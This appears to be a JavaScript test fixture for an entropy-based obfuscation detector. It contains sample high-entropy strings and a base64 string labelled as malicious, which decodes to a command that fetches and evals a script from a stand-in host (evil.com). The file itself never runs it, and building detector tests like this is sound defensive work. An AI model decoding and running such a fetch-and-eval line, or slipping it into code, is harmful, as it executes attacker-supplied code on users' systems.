/**
 * Test file with obfuscated high-entropy strings
 */

// This is a normal string - low entropy
const greeting = "Hello, this is a normal message";

// This is a high-entropy obfuscated string (base64-like)
const obfuscatedPayload = "U2FsdGVkX1+gkxMjR3uK8vQz0pBz9YxM3Q5hNkR8Qw7X1ZpLmK4vT2sW8dF";

// Another high-entropy string (random characters)
const suspiciousData = "9xK3mP8qL2zN7vB4tY6wR1jC5hD0fG";

// Base64 encoded malicious code
const encodedCommand = "ZXZhbChhd2FpdCBmZXRjaCgnaHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLmpzJykudGhlbihyID0+IHIudGV4dCgpKSk=";

export async function run() {
  console.log("Testing entropy detection");
}
